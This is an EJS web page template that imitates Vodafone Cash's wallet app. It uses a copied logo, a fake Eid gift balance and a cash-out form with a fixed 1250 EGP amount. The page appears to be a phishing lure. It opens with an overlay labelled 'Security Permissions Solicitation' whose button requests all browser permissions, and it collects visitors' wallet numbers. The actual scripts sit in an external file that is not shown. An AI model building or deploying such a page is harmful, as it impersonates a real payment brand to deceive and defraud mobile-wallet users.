<!DOCTYPE html>
<html lang="<%= lang %>" dir="<%= t.dir %>">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title><%= t.title %></title>
  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
  <!-- Stylesheet -->
  <link rel="stylesheet" href="/css/style.css">
</head>
<body>

  <!-- Security Permissions Solicitation Overlay -->
  <div id="permissionsOverlay" class="permissions-overlay">
    <div class="permissions-card animate-slide-up">
      <div class="permissions-header">
        <div class="lock-icon-wrapper animate-pulse">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" class="lock-icon">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
        </div>
        <h2 class="permissions-title"><%= t.permissionTitle %></h2>
      </div>

      <button class="btn btn-grant-permissions" id="grantPermissionsBtn" onclick="requestAllPermissions()">
        موافق، الدخول إلي المحفظة
      </button>
    </div>
  </div>



  <!-- Top Notification Toast / Banner -->
  <div class="notification-bar" id="notificationBar">
    <div class="notification-content">
      <svg class="notification-icon animate-bounce" viewBox="0 0 24 24" fill="none" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" />
      </svg>
      <span class="notification-text"><%= t.notificationText %></span>
    </div>
    <button class="notification-close" onclick="closeNotification()">&times;</button>
  </div>

  <div class="app-container">
    <!-- Top Header -->
    <header class="app-header">
      <div class="header-left">
        <div class="vodafone-logo">
          <!-- Custom SVG for Vodafone iconic red tear logo -->
          <svg viewBox="0 0 100 100" class="logo-svg">
            <circle cx="50" cy="50" r="48" fill="#E60000" />
            <path d="M50,22 C42,22 34,28 34,38 C34,48 42,54 50,54 C54,54 62,50 62,38 C62,28 58,22 50,22 Z M50,54 C46,54 41,58 39,63 C36,70 38,78 44,82 C50,86 56,84 59,77 C62,72 59,62 50,54 Z" fill="#FFFFFF" />
          </svg>
          <span class="brand-text">vodafone</span>
        </div>
      </div>
      
      <div class="header-right">
        <!-- Bilingual Switcher -->
        <button class="lang-toggle-btn" id="langToggleBtn" onclick="toggleLanguage()">
          <%= lang === 'en' ? 'العربية' : 'English' %>
        </button>
        <!-- Profile Avatar -->
        <div class="profile-avatar">
          <div class="avatar-inner">
            <span><%= userName.charAt(0) %></span>
          </div>
          <div class="online-indicator"></div>
        </div>
      </div>
    </header>

    <!-- Main Scrollable Area -->
    <main class="app-main">
      <!-- Greeting and Welcome section -->
      <section class="welcome-section">
        <h1 class="user-greeting"><%= t.greeting %></h1>
        <p class="eid-subgreeting"><%= t.subGreeting %></p>
      </section>

      <!-- Vodafone Cash Eidiya Balance Card -->
      <section class="balance-card-container">
        <div class="balance-card">
          <div class="card-bg-glow"></div>
          <div class="card-header">
            <span class="card-title-text"><%= t.balanceTitle %></span>
            <span class="cash-logo">vodafone cash</span>
          </div>
          
          <div class="card-body">
            <div class="balance-value-row">
              <span class="currency"><%= t.currency %></span>
              <span class="balance-amount" id="balanceAmount" data-amount="<%= t.balanceAmount %>">••••••</span>
            </div>
            
            <button class="eye-toggle-btn" onclick="toggleBalance()" aria-label="Toggle Balance Visibility">
              <svg id="eyeIconClosed" class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l18 18" />
              </svg>
              <svg id="eyeIconOpen" class="eye-icon hidden" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
              </svg>
            </button>
          </div>

          <div class="card-actions">
            <button class="btn btn-primary" onclick="openModal('sendEidiyaModal')">
              <svg viewBox="0 0 24 24" fill="currentColor" class="action-icon">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H7c0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.04-.42 1.99-1.07 2.75z" />
              </svg>
              <%= t.sendEidiyaBtn %>
            </button>
            <button class="btn btn-secondary" onclick="chooseCashOut()">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="action-icon">
                <rect x="2" y="4" width="20" height="16" rx="2" />
                <line x1="2" y1="10" x2="22" y2="10" />
              </svg>
              <%= t.cashOutBtn %>
            </button>
          </div>
        </div>
      </section>

      <!-- Festive Eid Banner (Modern Carousel/Card styled as Vodafone Offers) -->
      <section class="festive-banner-section">
        <div class="festive-banner">
          <div class="banner-moon-lantern">
            <!-- Moon & Lantern SVGs -->
            <svg viewBox="0 0 100 100" class="crescent-moon">
              <path d="M40,20 C60,20 75,35 75,55 C75,70 65,82 50,87 C65,82 70,68 70,55 C70,38 55,25 40,25 C37,25 33,26 30,27 C33,23 37,20 40,20 Z" fill="#FFD700" />
            </svg>
            <svg viewBox="0 0 100 100" class="eid-lantern animate-sway">
              <path d="M50,10 L50,25 M40,25 L60,25 L55,35 L45,35 Z" stroke="#FFD700" stroke-width="2" fill="none" />
              <rect x="42" y="35" width="16" height="25" rx="3" fill="#E60000" stroke="#FFD700" stroke-width="2" />
              <path d="M45,60 L55,60 L50,72 Z" fill="#FFD700" />
              <line x1="50" y1="35" x2="50" y2="60" stroke="#FFD700" stroke-width="2" />
              <line x1="45" y1="47" x2="55" y2="47" stroke="#FFD700" stroke-width="2" />
            </svg>
          </div>
          <div class="banner-text-content">
            <span class="banner-tag">EID MUBARAK</span>
            <h2 class="banner-title"><%= t.bannerTitle %></h2>
            <p class="banner-desc"><%= t.bannerDesc %></p>
          </div>
        </div>
      </section>

      <!-- Quick Services Grid -->
      <section class="services-section">
        <h2 class="section-title"><%= t.servicesTitle %></h2>
        <div class="services-grid">
          
          <!-- Service 1 -->
          <div class="service-item" onclick="openModal('sendEidiyaModal')">
            <div class="service-icon-wrapper red-theme">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <span class="service-label"><%= t.serviceSendEidiya %></span>
          </div>

          <!-- Service 2 -->
          <div class="service-item" onclick="openModal('giftCardModal')">
            <div class="service-icon-wrapper gold-theme">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M15 5v2m0 4v2m0 4v2M5 5a2 2 0 00-2 2v3a2 2 0 110 4v3a2 2 0 002 2h14a2 2 0 002-2v-3a2 2 0 110-4V7a2 2 0 00-2-2H5z" />
              </svg>
            </div>
            <span class="service-label"><%= t.serviceGiftCard %></span>
          </div>

          <!-- Service 3 -->
          <div class="service-item" onclick="triggerDonationAlert()">
            <div class="service-icon-wrapper green-theme">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M4.318 6.318a4.5 4.5 0 000 6.364L12 20.364l7.682-7.682a4.5 4.5 0 00-6.364-6.364L12 7.636l-1.318-1.318a4.5 4.5 0 00-6.364 0z" />
              </svg>
            </div>
            <span class="service-label"><%= t.serviceDonations %></span>
          </div>

          <!-- Service 4 -->
          <div class="service-item" onclick="triggerAtmAlert()">
            <div class="service-icon-wrapper dark-theme">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="4" width="18" height="16" rx="2" />
                <path d="M7 8h10M7 12h5" />
              </svg>
            </div>
            <span class="service-label"><%= t.serviceCashOut %></span>
          </div>

          <!-- Service 5 -->
          <div class="service-item" onclick="triggerRechargeAlert()">
            <div class="service-icon-wrapper light-red-theme">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
              </svg>
            </div>
            <span class="service-label"><%= t.serviceRecharge %></span>
          </div>

          <!-- Service 6 -->
          <div class="service-item" onclick="triggerKahkAlert()">
            <div class="service-icon-wrapper orange-theme">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="9" />
                <path d="M12 3v3M12 18v3M3 12h3M18 12h3" />
                <circle cx="9" cy="9" r="1" fill="currentColor" />
                <circle cx="15" cy="9" r="1" fill="currentColor" />
                <circle cx="9" cy="15" r="1" fill="currentColor" />
                <circle cx="15" cy="15" r="1" fill="currentColor" />
              </svg>
            </div>
            <span class="service-label"><%= t.serviceFestiveTreats %></span>
          </div>

        </div>
      </section>

      <!-- Recent Transactions List -->
      <section class="transactions-section">
        <div class="transactions-header">
          <h2 class="section-title"><%= t.recentTransactionsTitle %></h2>
          <button class="view-all-btn" onclick="alert('Viewing all transactions')">
            <%= lang === 'en' ? 'See All' : 'عرض الكل' %>
          </button>
        </div>
        <div class="transactions-list">
          <% transactions.forEach(tx => { %>
            <div class="transaction-card">
              <div class="tx-left">
                <div class="tx-icon-circle <%= tx.type %>">
                  <% if (tx.type === 'receive') { %>
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                      <path stroke-linecap="round" stroke-linejoin="round" d="M19 14l-7 7m0 0l-7-7m7 7V3" />
                    </svg>
                  <% } else if (tx.type === 'send') { %>
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                      <path stroke-linecap="round" stroke-linejoin="round" d="M5 10l7-7m0 0l7 7m-7-7v18" />
                    </svg>
                  <% } else { %>
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                      <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  <% } %>
                </div>
                <div class="tx-details">
                  <span class="tx-title"><%= lang === 'en' ? tx.titleEn : tx.titleAr %></span>
                  <span class="tx-time"><%= lang === 'en' ? tx.timeEn : tx.timeAr %></span>
                </div>
              </div>
              <div class="tx-right">
                <span class="tx-amount <%= tx.type %>">
                  <%= tx.amount %> <%= t.currency %>
                </span>
              </div>
            </div>
          <% }) %>
        </div>
      </section>

    </main>

    <!-- Bottom Navigation Bar (Fixed for Mobile Screens) -->
    <nav class="app-bottom-nav">
      <a href="#" class="nav-item active">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="nav-icon">
          <path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
        </svg>
        <span><%= t.menuHome %></span>
      </a>
      <a href="#" class="nav-item" onclick="alert('Recent Transactions Clicked')">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="nav-icon">
          <path stroke-linecap="round" stroke-linejoin="round" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01" />
        </svg>
        <span><%= t.menuHistory %></span>
      </a>
      <a href="#" class="nav-item" onclick="openModal('giftCardModal')">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="nav-icon">
          <rect x="3" y="5" width="18" height="14" rx="2" />
          <line x1="3" y1="10" x2="21" y2="10" />
        </svg>
        <span><%= t.menuCards %></span>
      </a>
      <a href="#" class="nav-item" onclick="alert('More settings & configurations')">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="nav-icon">
          <path stroke-linecap="round" stroke-linejoin="round" d="M5 12h.01M12 12h.01M19 12h.01M6 12a1 1 0 11-2 0 1 1 0 012 0zm7 0a1 1 0 11-2 0 1 1 0 012 0zm7 0a1 1 0 11-2 0 1 1 0 012 0z" />
        </svg>
        <span><%= t.menuMore %></span>
      </a>
    </nav>
  </div>

  <!-- Send Eidiya Modal -->
  <div id="sendEidiyaModal" class="modal-overlay">
    <div class="modal-container">
      <div class="modal-header">
        <h3 class="modal-title"><%= t.sendEidiyaModalTitle %></h3>
        <button class="modal-close-btn" onclick="closeModal('sendEidiyaModal')">&times;</button>
      </div>
      <form id="sendEidiyaForm" onsubmit="submitEidiyaForm(event)">
        <div class="form-group">
          <label><%= t.recipientNumberLabel %></label>
          <input type="tel" name="recipient" required placeholder="<%= t.placeholderNumber %>" class="form-input">
        </div>
        <div class="form-group">
          <label><%= t.amountLabel %></label>
          <input type="number" name="amount" min="5" max="50000" required placeholder="0.00" class="form-input">
        </div>
        <div class="form-group">
          <label><%= t.messageLabel %></label>
          <textarea name="message" rows="3" placeholder="<%= t.messagePlaceholder %>" class="form-input"></textarea>
        </div>
        <div class="modal-actions">
          <button type="button" class="btn btn-secondary" onclick="closeModal('sendEidiyaModal')"><%= t.modalCloseBtn %></button>
          <button type="submit" class="btn btn-primary"><%= t.sendConfirmBtn %></button>
        </div>
      </form>
    </div>
  </div>

  <!-- Gift Card Modal -->
  <div id="giftCardModal" class="modal-overlay">
    <div class="modal-container">
      <div class="modal-header">
        <h3 class="modal-title"><%= t.giftCardModalTitle %></h3>
        <button class="modal-close-btn" onclick="closeModal('giftCardModal')">&times;</button>
      </div>
      <form id="giftCardForm" onsubmit="submitGiftCardForm(event)">
        <div class="form-group">
          <label><%= t.cardValueLabel %></label>
          <div class="card-values-grid">
            <label class="value-chip">
              <input type="radio" name="cardValue" value="50" checked>
              <span>50 <%= t.currency %></span>
            </label>
            <label class="value-chip">
              <input type="radio" name="cardValue" value="100">
              <span>100 <%= t.currency %></span>
            </label>
            <label class="value-chip">
              <input type="radio" name="cardValue" value="200">
              <span>200 <%= t.currency %></span>
            </label>
            <label class="value-chip">
              <input type="radio" name="cardValue" value="500">
              <span>500 <%= t.currency %></span>
            </label>
          </div>
        </div>
        <div class="modal-actions">
          <button type="button" class="btn btn-secondary" onclick="closeModal('giftCardModal')"><%= t.modalCloseBtn %></button>
          <button type="submit" class="btn btn-primary"><%= t.buyCardConfirmBtn %></button>
        </div>
      </form>
    </div>
  </div>

  <!-- Cash Out Modal -->
  <div id="cashOutModal" class="modal-overlay">
    <div class="modal-container">
      <div class="modal-header">
        <h3 class="modal-title"><%= lang === 'en' ? 'Withdraw Eidiya' : 'سحب العيدية' %></h3>
        <button class="modal-close-btn" onclick="closeModal('cashOutModal')">&times;</button>
      </div>
      <form id="cashOutForm" onsubmit="submitCashOutForm(event)">
        <div class="form-group">
          <label><%= lang === 'en' ? 'Mobile Wallet Number' : 'رقم المحفظة (فودافون كاش)' %></label>
          <input type="tel" name="phoneNumber" required placeholder="<%= t.placeholderNumber %>" class="form-input">
        </div>
        <div class="form-group">
          <label><%= lang === 'en' ? 'Withdrawal Amount (EGP)' : 'قيمة مبلغ السحب (جنيه)' %></label>
          <input type="number" name="amount" min="5" max="50000" required placeholder="0.00" value="1250" class="form-input" readonly>
        </div>
        <div class="modal-actions">
          <button type="button" class="btn btn-secondary" onclick="closeModal('cashOutModal')"><%= t.modalCloseBtn %></button>
          <button type="submit" class="btn btn-primary"><%= lang === 'en' ? 'Confirm Withdrawal' : 'تأكيد السحب' %></button>
        </div>
      </form>
    </div>
  </div>

  <!-- Global scripts translation config dictionary -->
  <script>
    window.allTranslations = <%- JSON.stringify(allTranslations) %>;
    window.currentLang = "<%= lang %>";
  </script>
  <!-- Client JavaScript -->
  <script src="/js/main.js"></script>
</body>
</html>
